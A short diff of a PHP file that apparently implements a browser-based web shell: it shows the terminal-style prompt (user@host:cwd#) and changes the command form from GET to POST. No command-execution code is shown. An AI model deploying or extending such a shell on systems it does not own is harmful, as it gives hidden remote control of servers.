@@ -149,7 +149,7 @@ function disable_ob() {
 			} ?>
 			</div>
             <div class="input" id="input">
-                <form id="form" method="GET">
+                <form id="form" method="POST">
                     <div class="username" id="username">
 					<div style='color: #ff0000; display: inline;'><?php echo $name;?>@<?php echo $host;?></div>:<?php echo getcwd();?>#
 					</div>
